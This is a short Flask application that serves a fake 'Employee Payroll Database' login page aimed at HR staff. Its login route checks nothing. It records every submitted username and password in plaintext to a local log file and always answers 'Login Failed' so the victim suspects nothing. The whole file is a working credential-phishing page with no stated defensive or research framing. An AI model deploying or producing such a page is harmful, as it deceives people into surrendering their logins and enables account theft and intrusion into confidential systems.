from flask import Flask, request, render_template_string
import logging

app = Flask(__name__)

# Set up logging
logging.basicConfig(filename='user_data.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Simple login form
HTML_FORM = """
<!DOCTYPE html>
<html>
<head>
    <title>Employee Payroll Database</title>
</head>
<body>
<div style="text-align: center">
    <h2>Payroll Database</h2>
    <h3>Only HR Employees are Permitted to Access this Confidential Information!</h3>
    <form method="post" action="/login">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_FORM)

@app.route('/login', methods=['POST'])
def login():
    # Get data from the form
    username = request.form.get('username')
    password = request.form.get('password')

    # Log the credentials
    logging.info(f"Username: {username}, Password: {password}")

    return "Login Failed! Username or password is incorrect. Please try again."

if __name__ == "__main__":
    app.run(debug=True, port=5000)
